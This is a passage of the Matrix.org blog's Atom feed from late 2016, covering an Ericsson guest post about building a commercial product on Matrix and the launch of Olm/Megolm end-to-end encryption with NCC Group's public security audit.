 	&lt;li&gt;Maturing and polishing the spec (we are way overdue a new release)&lt;&#x2F;li&gt;
 	&lt;li&gt;Improving VoIP - especially conferencing.&lt;&#x2F;li&gt;
 	&lt;li&gt;Reputation&#x2F;Moderation management (i.e. spam&#x2F;abuse filtering).&lt;&#x2F;li&gt;
 	&lt;li&gt;Much-needed SDK performance work on matrix-{&#x27;{&#x27;}react,ios,android{&#x27;}&#x27;}-sdk.&lt;&#x2F;li&gt;
 	&lt;li&gt;...and a few other things which would be premature to mention right now :D&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
This is going to be an incredibly exciting ride (right now, it feels a bit like being on a toboggan which has made its way onto a fairly steep ski slope...) and we can only thank you: the community, for getting the project to this point - whether you&#x27;re hacking on Matrix, contributing pull requests, filing issues, testing apps, spreading the word, or just simply using it.
&lt;p&gt;See you in 2017, and thanks again for flying Matrix.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Matthew, Amandine &amp;amp; the Matrix Team.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>When Ericsson discovered Matrix...</title>
        <published>2016-11-23T00:00:00+00:00</published>
        <updated>2016-11-23T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/11/23/when-ericsson-discovered-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2016/11/23/when-ericsson-discovered-matrix/</id>
        
        <content type="html">&lt;p&gt;&lt;i&gt;As something completely different, we&#x27;ve invited Stefan Ålund and his team at Ericsson to write a guest blog
post about the really cool stuff Ericsson is doing with Matrix.  This is a fascinating glimpse into how major folks
are already launching commercial products on top of Matrix - whilst also making significant contributions back to
the projects and the community.  We&#x27;d like to thank Stefan and Ericsson for all their support and perseverance,
and we wish them the very best with the Ericsson Contextual Communication Cloud!
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;i&gt;-- Matthew
&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
&lt;p&gt;At the end of 2014, my colleague Adam Bergkvist and I attended the WebRTC Expo in Paris, partly to promote our
Open Source project &lt;a href=&quot;https:&#x2F;&#x2F;www.openwebrtc.org&quot;&gt;OpenWebRTC&lt;&#x2F;a&gt;, but also to meet the rest of the European
WebRTC community and see what others were working on. &lt;&#x2F;p&gt;
&lt;p&gt;At Ericsson Research we had been working on WebRTC for quite some time. Not only on the client-side framework and
how those could enable some truly &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=0nl0fuWzoGk&quot;&gt;experimental stuff&lt;&#x2F;a&gt;, but
more importantly how this emerging technology could be used to build new kinds of communication services where
communication is not &lt;em&gt;the&lt;&#x2F;em&gt; service (A calling B), but is integrated as part of some other service or context. A simple
example would be a health care solution, where the starting point could be the patient records and communication
technologies are integrated to enable remote discussions between patients and their doctors.&lt;&#x2F;p&gt;
&lt;p&gt;Our research in this area, that we started calling “contextual communication”, pointed in a different direction from
Ericsson&#x27;s traditional communication business, therefore making it hard for us to transfer our ideas and technologies
out from Ericsson Research. We increasingly had the feeling that we needed to build something new and start from a
clean slate, so to speak.&lt;&#x2F;p&gt;
&lt;p&gt;Some of our guiding principles:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Flexibility - the communication should be able to integrate anywhere
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Fast iterations - browsers and WebRTC are moving targets
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Open - interoperability is important for communication systems
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Low cost - operations for the core communication should approach 0
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Trust - build on the Ericsson brand and technology leadership 
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
We had a pretty good idea about what we wanted to build, but even though Ericsson is a big company, the team working in this area was relatively small and also had a number of other commitments that we couldn&#x27;t abandon.
&lt;p&gt;I think that is enough of a background, let&#x27;s circle back to the WebRTC Expo and the reason why I am writing this post on the Matrix blog.&lt;&#x2F;p&gt;
&lt;p&gt;Adam and I were pretty busy in &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;OpenWebRTC&#x2F;status&#x2F;544781293838684161&quot;&gt;our booth&lt;&#x2F;a&gt; talking
to people and giving demos, so we actually missed when Matrix won
the &lt;a href=&quot;&#x2F;blog&#x2F;2014&#x2F;12&#x2F;24&#x2F;matrix-wins-best-innovation-award-at-webrtc-paris&#x2F;&quot;&gt; Best Innovation Award&lt;&#x2F;a&gt;.
Nonetheless we finally got some time to walk around and I started chatting with Matthew and Amandine who were manning
the Matrix booth. Needless to say, I was really impressed with their vision and what they wanted to build. The
comparison to email and how they wanted to make it possible to build an interoperable bridge between communication
“islands”, all in an open (source) manner, really appealed to me.&lt;&#x2F;p&gt;
&lt;p&gt;To be honest, the altruistic aspects of decentralising communication was not the most important part for us,
even if we were sympathetic to the cause, working for a company that was founded from
&amp;quot;&lt;a href=&quot;http:&#x2F;&#x2F;www.ericsson.hr&#x2F;lars-magnus-ericsson-entrepreneur&quot;&gt;the belief that communication is a basic human need&lt;&#x2F;a&gt;&amp;quot;.
We ultimately wanted to build a new kind of communication offering from Ericsson, and it looked like Matrix might be able
to play a part in that.&lt;&#x2F;p&gt;
&lt;p&gt;I had recently hired a couple of &lt;a href=&quot;http:&#x2F;&#x2F;teknikspranget.se&quot;&gt;interns&lt;&#x2F;a&gt; and as soon as I came back from Paris, we
set them to work evaluating Matrix. They were quickly able to port an existing WebRTC service (developed and used in-house)
to use Matrix signalling and user management. We initially had some concerns about the maturity of the reference
Home Server &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;implementation&lt;&#x2F;a&gt; (remember, this was almost 2 years ago) and
we didn&#x27;t want to start developing our own since we were still a small team. However, Matthew and the rest of the Matrix
team worked closely with us, helping to answer all our (dumb) questions and we finally got to a point where we had the
confidence to say “screw it, let&#x27;s try this and see if it flies”. ?&lt;&#x2F;p&gt;
&lt;p&gt;Ericsson had recently launched the &lt;a href=&quot;https:&#x2F;&#x2F;www.ericsson.com&#x2F;innovation&#x2F;ericsson-garage&quot;&gt;Ericsson Garage&lt;&#x2F;a&gt; where
employees could pitch ideas for how to build new business. So we decided to give the process a try and presented an idea
on how Ericsson could start selling contextual communication as-a-Service, directly to enterprises that wanted help
integrating communication into their business processes, but didn&#x27;t necessarily have the competence or business interest
to run their own communication services. We got accepted and moved (physically) out of Research to sit in the Garage for
the next 4 months, developing a &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Minimum_viable_product&quot;&gt;MVP&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Since the primary interface to our offering would be through SDKs on various platforms, we decided early on to develop our
own. The SDKs were implementing the standard Matrix specification, but we put a lot of time in increasing the robustness
and flexibility in the WebRTC call handling and eventually with added peer-2-peer data and collaboration features, on top
of the secure WebRTC &lt;a href=&quot;https:&#x2F;&#x2F;tools.ietf.org&#x2F;html&#x2F;draft-ietf-rtcweb-data-channel-13&quot;&gt;DataChannel&lt;&#x2F;a&gt;. On the
server side, our initialconcerns about Synapse were eventually removed completely as the Matrix team relentlessly kept
working on fixing performance issues, patching security holes and provided a story on how to scale. Over the years we
have contributed with several patches to Synapse (SAML auth and auth improvements; application service improvements) and
provided input to the Matrix specification. We have always found the Matrix team be very inclusive and easy to work with.&lt;&#x2F;p&gt;
&lt;p&gt;The project graduated successfully from the Ericsson Garage and moved in to Ericsson&#x27;s Business Unit IT &amp;amp; Cloud
Products, where we started to increase the size of the team and just last month signed a contract with our first
customer. We call the solution Ericsson Contextual Communication Cloud, or ECCC for short, and it can be summarised on a
high level by the following picture:&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-full wp-image-1852&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;11&#x2F;Picture1.png&quot; alt=&quot;ECCC in a nutshell&quot; width=&quot;975&quot; height=&quot;546&quot; &#x2F;&gt;
&lt;p&gt;If you are interested in ECCC, feel free to reach out at &lt;a href=&quot;https:&#x2F;&#x2F;discuss.c3.ericsson.net&quot;&gt;https:&#x2F;&#x2F;discuss.c3.ericsson.net&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As with any project developed in the open, it is essential to have a healthy community around it. We have received
excellent support from the Matrix project and they have always been open for discussion, engaged our developers and
listened to our needs. We depend on Matrix now and we see great potential for the future. We hope that others will adopt the 
technology and help make the community grow even stronger.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Stefan Ålund and the Ericsson ECCC Team&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix’s ‘Olm’ End-to-end Encryption security assessment released - and implemented cross-platform on Riot at last!</title>
        <published>2016-11-21T00:00:00+00:00</published>
        <updated>2016-11-21T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/11/21/matrix-s-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last/" type="text/html"/>
        <id>https://matrix.org/blog/2016/11/21/matrix-s-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last/</id>
        
        <content type="html">&lt;p&gt;TL;DR: We&#x27;re officially starting the cross-platform beta of end-to-end encryption in Matrix today, with matrix-js-sdk, matrix-android-sdk and matrix-ios-sdk all supporting e2e via the &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;olm.html&quot;&gt;Olm&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;Megolm&lt;&#x2F;a&gt; cryptographic ratchets.  Meanwhile, &lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&quot;&gt;NCC Group have publicly released their security assessment&lt;&#x2F;a&gt; of the underlying libolm library, kindly funded by the &lt;a href=&quot;https:&#x2F;&#x2F;www.opentech.fund&#x2F;&quot;&gt;Open Technology Fund&lt;&#x2F;a&gt;, giving a full and independent transparent report on where the core implementation is at. The assessment was incredibly useful, finding some interesting issues, which have all been solved either in libolm itself or at the Matrix client SDK level.&lt;&#x2F;p&gt;
&lt;p&gt;If you want to get experimenting with E2E, the flagship Matrix client &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&quot;&gt;Riot&lt;&#x2F;a&gt; has been updated to use the new SDK on Web, Android and iOS… although the iOS App is currently stuck in “export compliance” review at Apple. However, iOS users can mail &lt;a href=&quot;mailto:support@riot.im&quot;&gt;support@riot.im&lt;&#x2F;a&gt; to request being added to the TestFlight beta to help us test!  &lt;strong&gt;Update: iOS is now live and approved by Apple (as of Thursday Nov 24.  You can still mail us if you want to get beta builds though!)&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We are ridiculously excited about adding an open decentralised e2e-encrypted pubsub data fabric to the internet, and we hope you are too! :D&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Ever since the beginning of the Matrix we&#x27;ve been promising end-to-end (E2E) encryption, which is rather vital given conversations in Matrix are replicated over every server participating in a room.  This is no different to SMTP and IMAP, where emails are typically stored unencrypted in the IMAP spools of all the participating mail servers, but we can and should do much better with Matrix: there is no reason to have to trust all the participating servers not to snoop on your conversations.  Meanwhile, the internet is screaming out for an open decentralised e2e-encrypted pubsub data store - which we&#x27;re now finally able to provide :)&lt;&#x2F;p&gt;
&lt;p&gt;Today marks the start of a formal public beta for our &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;Megolm&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;olm.html&quot;&gt;Olm&lt;&#x2F;a&gt;-based end-to-end encryption across Web, Android and iOS. New builds of the &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&quot;&gt;Riot&lt;&#x2F;a&gt; matrix client have just been released on top of the newly 
Megolm
-capable &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&quot;&gt;matrix-js-sdk&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;matrix-ios-sdk&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&quot;&gt;matrix-android-sdk&lt;&#x2F;a&gt; libraries
.  The stuff that ships today is:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;b&gt;E2E encryption, based on the &lt;a href=&quot;&#x2F;git&#x2F;olm&#x2F;about&quot;&gt;Olm&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Double_Ratchet_Algorithm&quot;&gt;Double Ratchet&lt;&#x2F;a&gt; and Megolm ratchet, working in beta on all three platforms&lt;&#x2F;b&gt;.  We&#x27;re still chasing a few nasty bugs which can cause ‘unknown inbound session IDs&#x27;, but in general it should be stable: please report these via Github if you see them.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;b&gt;Encrypted attachments are here!&lt;&#x2F;b&gt; (limited to ~2MB on web, but as soon as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;562&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;562&lt;&#x2F;a&gt; lands this limit will go away)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;b&gt;Encrypted VoIP signalling&lt;&#x2F;b&gt; (and indeed any arbitrary Matrix events) are here!
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Tracking whether the messages you receive are from &lt;strong&gt;‘verified&#x27; devices&lt;&#x2F;strong&gt; or not.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Letting you &lt;strong&gt;block specific target devices&lt;&#x2F;strong&gt; from being able to decrypt your messages or not.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;strong&gt;The &lt;a href=&quot; http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;e2e_implementation.html&quot;&gt;Official Implementor&#x27;s Guide&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;.  If you&#x27;re a developer wanting to add Olm into your Matrix client&#x2F;bot&#x2F;bridge etc, this is the place to start.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Stuff which remains includes:
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Speeding up sending the first message after adds&#x2F;removes a device from a room (this can be &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;vector-web&#x2F;issues&#x2F;2157&quot;&gt;&lt;em&gt;very&lt;&#x2F;em&gt; slow&lt;&#x2F;a&gt; currently - e.g. 10s, but we can absolutely do better).
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Proper device verification.  Currently we compare out-of-band device fingerprints, which is a terrible UX.  Lots of work to be done here.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Turning on encryption for private rooms by default.  We&#x27;re deliberately keeping E2E opt-in for now during beta given there is a small risk of undecryptable messages, and we don&#x27;t want to lull folks into a false sense of security.  As soon as we&#x27;re out of beta, we&#x27;ll obviously be turning on E2E for any room with private history by default.  This also gives the rest of the Matrix ecosystem a chance to catch up, as we obviously don&#x27;t want to lock out all the clients which aren&#x27;t built on matrix-{&#x27;{&#x27;}js,ios,android{&#x27;}&#x27;}-sdk.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;We&#x27;re also considering building a simple Matrix proxy to aid migration that you can run on localhost that E2Es your traffic as required (so desktop clients like WeeChat, NaChat, Quaternion etc would just connect to the proxy on localhost via pre-E2E Matrix, which would then manage all your keys &amp; sessions &amp; ratchets and talk E2E through to your actual homeserver.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Matrix clients which can&#x27;t speak E2E won&#x27;t show encrypted messages at all.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;...&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;vector-web&#x2F;issues?q=is%3Aissue%20is%3Aopen%20label%3Atype%3Ae2e&quot;&gt;lots and lots of bugs&lt;&#x2F;a&gt; :D
.  We&#x27;ll be out of beta once these are all closed up.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
In practice the system is working very usably, especially for 1:1 chats.  Big group chats with lots of joining&#x2F;parting devices are a bit more prone to weirdness, as are edge cases like running multiple Riot&#x2F;Webs in adjacent tabs on the same account.  Obviously we don&#x27;t recommend using the E2E for anything mission critical requiring 100% guaranteed privacy whilst we&#x27;re still in beta, but we do thoroughly recommend everyone to give it a try and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;vector-web&#x2F;issues&quot;&gt;file bugs&lt;&#x2F;a&gt;!
&lt;p&gt;In Riot you can turn it on a per-room basis if you&#x27;re an administrator that room by flipping the little padlock button in Room Settings.  Warning: once enabled, you cannot turn it off again for that room (to avoid the race condition of people suddenly decrypting a room before someone says something sensitive):&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter wp-image-1849&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;11&#x2F;Screen-Shot-2016-11-21-at-15.21.15-1024x646.png&quot; alt=&quot;screen-shot-2016-11-21-at-15-21-15&quot; width=&quot;552&quot; height=&quot;348&quot; &#x2F;&gt;
&lt;p&gt;The journey to end-to-end encryption has been a bit convoluted, with work beginning in Feb 2015 by the Matrix team on &lt;a href=&quot;&#x2F;git&#x2F;olm&quot;&gt;&lt;b&gt;Olm&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;: an independent Apache-licensed implementation in C&#x2F;C++11 of the Double Ratchet algorithm designed by Trevor Perrin and Moxie Marlinspike (
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;trevp&#x2F;double_ratchet&#x2F;wiki&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;trevp&#x2F;double_ratchet&#x2F;wiki&lt;&#x2F;a&gt; - then called ‘axolotl&#x27;).  We picked the Double Ratchet in its capacity as the most ubiquitous, respected and widely studied e2e algorithm out there - mainly thanks to Open Whisper Systems implementing it in Signal, and subsequently licensing it to Facebook for WhatsApp and Messenger, Google for Allo, etc.  And we reasoned that if we are ever to link huge networks like WhatsApp into Matrix whilst preserving end-to-end encrypted semantics, we&#x27;d better be using at least roughly the same technology :D&lt;&#x2F;p&gt;
&lt;p&gt;One of the first things we did was to write a &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;olm.html&quot;&gt;terse but formal spec&lt;&#x2F;a&gt; for the Olm implementation of the Double Ratchet, fleshing out the original sketch from Trevor &amp;amp; Moxie, especially as at the time there wasn&#x27;t a formal spec from Open Whisper Systems (until yesterday! Congratulations to Trevor &amp;amp; co for publishing their &lt;a href=&quot;https:&#x2F;&#x2F;whispersystems.org&#x2F;docs&#x2F;specifications&#x2F;doubleratchet&#x2F;&quot;&gt;super-comprehensive spec&lt;&#x2F;a&gt; :).  We wrote a first cut of the ratchet over the course of a few weeks, which looked pretty promising but then the team got pulled into improving Synapse performance and features as our traffic started to accelerate faster than we could have possibly hoped.  We then got back to it again in June-Aug 2015 and basically finished it off and added a basic implementation to matrix-react-sdk (and picked up by Vector, now Riot)… before getting side-tracked again.  After all, there wasn&#x27;t any point in adding e2e to clients if the rest of the stack is on fire!&lt;&#x2F;p&gt;
&lt;p&gt;Work resumed again in May 2016 and has continued ever since - starting with the addition of a new ratchet to the mix.  The Double Ratchet (Olm) is great at encrypting conversations between pairs of devices, but it starts to get a bit unwieldy when you use it for a group conversation - especially the huge ones we have in Matrix.  Either each sender needs to encrypt each message N times for every device in the room (which doesn&#x27;t scale), or you need some other mechanism.&lt;&#x2F;p&gt;
&lt;p&gt;For Matrix we also require the ability to explicitly decide how much conversation history may be shared with new devices.  In classic Double Ratchet implementations this is anathema: the very act of synchronising history to a new device is a huge potential privacy breach - as it&#x27;s deliberately breaking perfect forward secrecy.  Who&#x27;s to say that the device you&#x27;re syncing your history onto is not an attacker?  However, in practice, this is a very common use case.  If a Matrix user switches to a new app or device, it&#x27;s often very desirable that they can decrypt old conversation history on the new device.  So, we make it configurable per room.  (In today&#x27;s implementation the ability to share history to new devices is still disabled, but it&#x27;s coming shortly).&lt;&#x2F;p&gt;
&lt;p&gt;The end result is an entirely new ratchet that we&#x27;ve called &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;&lt;b&gt;Megolm&lt;&#x2F;b&gt;&lt;&#x2F;a&gt; - which is included in the same &lt;a href=&quot;&#x2F;git&#x2F;olm&quot;&gt;libolm library&lt;&#x2F;a&gt; as Olm.  The way Megolm works is to give every sender in the room its own encrypted ratchet (‘outbound session&#x27;), so every device encrypts each message once based on the current key given by their ratchet (and then advances the ratchet to generate a new key).  Meanwhile, the device shares the state of their ‘outbound session&#x27; to every other device in the room via the normal Olm ratchet in a 1:1 exchange between the devices.  The other devices maintain an ‘inbound session&#x27; for each of the devices they know about, and so can decrypt their messages.  Meanwhile, when new devices join a room, senders can share their sessions according to taste to the new device - either giving access to old history or not depending on the configuration of the room.  You can read more in the &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;formal spec for Megolm&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We finished the combination of Olm and Megolm back in September 2016, and shipped the very first implementation in the matrix-js-sdk and matrix-react-sdk as used in &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&quot;&gt;Riot&lt;&#x2F;a&gt; with some major limitations (no encrypted attachments; no encrypted VoIP signalling; no history sharing to new devices).&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, we were incredibly lucky to receive a public security assessment of the Olm &amp;amp; Megolm implementation in libolm from &lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-services&#x2F;security-consulting&#x2F;cryptography-services&#x2F;&quot;&gt;NCC Group Cryptography Services&lt;&#x2F;a&gt; - famous for assessing the likes of Signal, Tor, OpenSSL, etc and other Double Ratchet implementations. The assessment was very generously funded by the &lt;a href=&quot;https:&#x2F;&#x2F;opentech.fund&quot;&gt;Open Technology Fund&lt;&#x2F;a&gt; (who specialise in paying for security audits for open source projects like Matrix).  Unlike other Double Ratchet audits (e.g. Signal), we also insisted that the end report was publicly released for complete transparency and to show the whole world the status of the implementation.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&#x2F;&quot;&gt;NCC Group have released the public report today&lt;&#x2F;a&gt; - it&#x27;s pretty hardcore, but if you&#x27;re into the details please go check it out.  The version of libolm assessed was v1.3.0, and the report found 1 high risk issue, 1 medium risk, 6 low risk and 1 informational issues - of which 3 were in Olm and 6 in Megolm.  Two of these (‘Lack of Backward Secrecy in Group Chats&#x27; and ‘Weak Forward Secrecy in Group Chats&#x27;) are actually features of the library which power the ‘configurable privacy per-room&#x27; behaviour mentioned a few paragraphs above - and it&#x27;s up to the application (e.g. matrix-js-sdk) to correctly configure privacy-sensitive rooms with the appropriate level of backward or forward secrecy; the library doesn&#x27;t enforce it however.  The most interesting findings were probably the fairly exotic Unknown Key Share attacks in both Megolm and Olm - check out NCC-Olm2016-009 and NCC-Olm2016-010 in the report for gory details!&lt;&#x2F;p&gt;
&lt;p&gt;Needless to say all of these issues have been solved with the release of libolm 2.0.0 on October 25th and included in today&#x27;s releases of the client SDKs and Riot.  Most of the issues have been solved at the application layer (i.e. matrix-js-sdk, ios-sdk and android-sdk) rather than in libolm itself.  Given the assessment was specifically for libolm, this means that technically the risks still exist at libolm, but given the correct engineering choice was to fix them in the application layer we went and did it there. (This is explains why the report says that some of the issues are ‘not fixed&#x27; in libolm itself).&lt;&#x2F;p&gt;
&lt;p&gt;Huge thanks to Alex Balducci and Jake Meredith at NCC Group for all their work on the assessment - it was loads of fun to be working with them (over Matrix, of course) and we&#x27;re really happy that they caught some nasty edge cases which otherwise we&#x27;d have missed.  And thanks again to Dan Meredith and Chad Hurley at OTF for funding it and making it possible!&lt;&#x2F;p&gt;
&lt;p&gt;Implementing decentralised E2E has been by far the hardest thing we&#x27;ve done yet in Matrix, ending up involving most of the core team.  Huge kudos go to: Mark Haines for writing the original Olm and matrix-js-sdk implementation and devising Megolm, designing attachment encryption and implementing it in matrix-{&#x27;{&#x27;}js,react{&#x27;}&#x27;}-sdk, Richard van der Hoff for taking over this year with implementing and speccing Megolm, finalising libolm, adding all the remaining server APIs (device management and to_device management for 1:1 device Olm sessions), writing the &lt;a href=&quot; http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;e2e_implementation.html&quot;&gt;Implementor&#x27;s Guide&lt;&#x2F;a&gt;, handling the NCC assessment, and pulling together all the strands to land the final implementation in matrix-js-sdk and matrix-react-sdk.  Meanwhile on Mobile, iOS &amp;amp; Android wouldn&#x27;t have happened without Emmanuel Rohée, who led the development of E2E in matrix-ios-sdk and &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;git&#x2F;olm&#x2F;log&#x2F;?h=olmkit&quot;&gt;OLMKit&lt;&#x2F;a&gt; (the iOS wrappers for libolm based on the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chrisballinger&#x2F;OLMKit&quot;&gt;original work by Chris Ballinger&lt;&#x2F;a&gt; at &lt;a href=&quot;https:&#x2F;&#x2F;chatsecure.org&#x2F;&quot;&gt;ChatSecure&lt;&#x2F;a&gt; - many thanks to Chris for starting the ball rolling there!), Pedro Contreiras and Yannick Le Collen for doing all the Android work, Guillaume Foret for all the application layer iOS work and helping coordinate all the mobile work, and Dave Baker who got pulled in at the last minute to rush through encrypted attachments on iOS (thanks Dave!).  Finally, eternal thanks to everyone in the wider community who&#x27;s patiently helped us test the E2E whilst it&#x27;s been in development in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#megolm:matrix.org&quot;&gt;#megolm:matrix.org&lt;&#x2F;a&gt;; and to Moxie, Trevor and &lt;a href=&quot;https:&#x2F;&#x2F;whispersystems.org&quot;&gt;Open Whisper Systems&lt;&#x2F;a&gt; for inventing the Double Ratchet and for allowing us to write our own implementation in Olm.&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s literally the beginning for end-to-end encryption in Matrix, and we&#x27;re unspeakably excited to see where it goes.  More now than ever before the world needs an open communication platform that combines the freedom of decentralisation with strong privacy guarantees, and we hope this is a major step in the right direction.&lt;&#x2F;p&gt;
&lt;p&gt;-- Matthew, Amandine &amp;amp; the whole Matrix team.&lt;&#x2F;p&gt;
&lt;p&gt;Further reading:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Libolm website: &lt;a href=&quot;&#x2F;git&#x2F;olm&#x2F;about&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;git&#x2F;olm&#x2F;about&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Libolm implementor&#x27;s guide: &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;e2e_implementation.html&quot;&gt;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;e2e_implementation.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Formal specification for Olm: &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;olm.html&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;olm.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Formal specification for Megolm: &lt;a href=&quot;&#x2F;docs&#x2F;spec&#x2F;megolm.html&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;megolm.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Formal specification for E2E in Matrix (WIP, yet to be merged): &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;speculator&#x2F;spec&#x2F;drafts%2Fe2e&#x2F;client_server&#x2F;unstable.html#end-to-end-encryption&quot;&gt;http:&#x2F;&#x2F;matrix.org&#x2F;speculator&#x2F;spec&#x2F;drafts%2Fe2e&#x2F;client_server&#x2F;unstable.html#end-to-end-encryption&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
